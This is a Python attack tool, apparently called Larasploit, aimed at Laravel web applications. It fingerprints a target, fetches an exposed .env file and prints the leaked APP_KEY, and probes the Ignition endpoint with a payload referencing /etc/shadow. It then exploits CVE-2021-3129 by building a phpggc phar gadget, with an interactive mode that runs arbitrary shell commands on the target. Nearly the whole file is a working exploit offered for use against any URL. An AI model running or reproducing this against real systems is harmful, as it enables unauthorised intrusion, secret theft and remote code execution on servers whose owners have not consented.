#!/usr/bin/env python

import sys, os
import json

import ssl 
ssl._create_default_https_context = ssl._create_unverified_context

import urllib3, requests
urllib3.disable_warnings()

import ignition_rce.main as ig
from design.banner import banner
from utils.agent import get_user_agent

from rich import print
from bs4 import BeautifulSoup

host = ""
app_key = ""

def fingerprint():
    global host
    global app_key

    fingerprint_data = dict()

    headers = {'User-Agent': get_user_agent()}
    proxy = {}

    response = requests.get(host, headers=headers, verify=False, allow_redirects=True)

    print(f'[bold green]')
    print(f"[yellow][~] Application Fingerprint [/]\r\n")

    print(f'[green][HTTP STATUS]: [/][bold green]{response.status_code} [/]')

    if('Location' in response.headers):
        print(f'[green][HTTP Redirect]: [/][bold green]{response.headers["Location"]}[/]')


    if('server' in response.headers and response.headers['Server']):
        fingerprint_data['server']  =  response.headers['server']

        print(f'[green][Server]: [/][bold green]{response.headers["Server"]}[/]')


    if('X-Powered-By' in response.headers and 'PHP' in response.headers['X-Powered-By']):
        fingerprint_data['php_version'] =  response.headers['X-Powered-By']

        print(f'[green][PHP Version]: [/][bold green]{response.headers["X-Powered-By"]}[/]')


    for cookie in dict(response.cookies):
            if('XSRF-TOKEN' in cookie or '_session' in cookie):
                fingerprint_data[cookie] = response.cookies[cookie]
                print(f'[green][Common Laravel Cookie]:[/] [bold green]{cookie}: {response.cookies[cookie][:20]}...[/]')
    

    if(r'_ignition\/' in response.text):
            fingerprint_data['laravel_default'] =  True
            fingerprint_data['laravel_ignition'] =  True

            print(f'[yellow][INFO]: [b]Laravel 8 detected (with ignition)! [/][/]')
    
    if('Laravel v8' in response.text):
            fingerprint_data['laravel_default'] =  True
            print(f'[yellow][INFO]: [b]Laravel 8 detected! [/][/]')

    soup = BeautifulSoup(response.text, "html.parser")

    laravel_version = ""

    for searchWrapper in soup.find_all('div', {'class':'ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0'}):
        laravel_version = searchWrapper.text.strip()

    if(laravel_version):
        print(f'[yellow][INFO]: Default laravel instalation detected! [/]')
        print(f'[yellow][Version]: [b]{laravel_version}[/][/]')

        fingerprint_data['laravel_version'] = laravel_version

    laravel_default = ""

    for searchWrapper in soup.find_all('div', {'class':'title m-b-md'}):
        text = searchWrapper.text.strip()
        if(text == "Laravel"):
            laravel_default = True

    for searchWrapper in soup.find_all('div', {'class':'links'}):
        text = searchWrapper.find('a').text.strip()
        if(text == "Laravel" or text == "Docs"):
            laravel_default = True

    if(laravel_default):
        fingerprint_data['laravel_default'] =  True

        print(f'\n[yellow][INFO]: Default Laravel installation detected![/]')
        print(f'[yellow][Version]: Laravel < 7 [/]')

   
    env_testing = requests.get(host + "/.env", headers=headers, verify=False)

    if(env_testing.status_code == 200):
        if('APP_ENV' in env_testing.text):
            fingerprint_data['laravel_env'] =  True
            print(f"[red][VULN] Vulnerability detected: .env file exposed\n [/]")

            for env_line in env_testing.text.split('\n'):
                if(env_line.startswith('APP_KEY')):
                    print(f'[yellow] [INFO]: [bold green]APP_KEY leaked: {env_line.split("=")[1]}[/]')

                    app_key = env_line.split("=")[1]

                if("APP_DEBUG" in env_line):
                    if(env_line == "APP_DEBUG=true"):
                        print(f'\n[yellow][INFO]: Application running in Debug Mode (detected with .env file)[/]')
                    else:
                        print(f'\n[yellow][INFO]: Application running without Debug Mode[/]')

    return fingerprint_data

def checkdebug():
    global host

    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'] # Use to trigger "Method not allowed on laravel"

    for method in methods:
        try:
            response = requests.request(method, host, verify=False)
            if(response.status_code == 405):
                if 'MethodNotAllowedHttpException' in response.text:
                    return True
        except:
            pass


def check_requirements():
    fail = False
    if(os.path.isfile('./phpggc/phpggc') == False):
        print(f'[red][ERR]: Missing phpggc, READ THE FUCKING README! [/]')
        fail = True

    if(fail):
        exit()


def check_ignition():

    global host
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'deflate'}
    data = '{"solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "/etc/shadow"}}'

    response = requests.post(host + '/_ignition/execute-solution', data, headers=headers, verify=False)

    if('[red] [WARNING]: failed to open stream: Permission denied [/]' in response.text):
        return True
    else:
        return False


def main():
    global host
   
    banner()
    check_requirements()
    
    if(len(sys.argv) > 1):
        host = sys.argv[1]
        print(f"[green][Target]:[/] [bold green]{host}[/]")

        fp = fingerprint()

        if('laravel_env' in json.loads(json.dumps(fp))):
            print(f'[yellow] [INFO]: Brace for attack... [/]')
            
        else:
            debug = checkdebug()

            if(debug):
                print(f'\n[yellow][INFO]: Application running in Debug Mode (got via HTTP Method not allowed)[/]')

        ignition_vuln = check_ignition()
        if(ignition_vuln):
            print(f"[red][VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129 [/]")
            print(f"[red][Exploiting] Remote Code Execution with CVE-2021-3129 \n[/]")

            if('-i' in sys.argv):
                print(f'[magenta][!] Larasploit Interactive session [ON] [/]')
                cmd = 'id'

                while(cmd != "exit"):
                    os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system '{cmd}'")
                    ig.main(host, './exploit.phar', None)
                    cmd = input(f'[bold green][iCMD][/]$ ')

            else:
                os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system id")
                ig.main(host, './exploit.phar', None)


    else:
        print(f"[bold yellow][😈] USE: python3 {sys.argv[0]} https://target.com\r\n [/]")
        print(f"[bold yellow][😈] USE: python3 {sys.argv[0]} https://target.com -i [magenta](interactive mode)\r\n [/][/]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\r\n[red][😈] (CTRL + C detected) Exiting...\r\n [/]")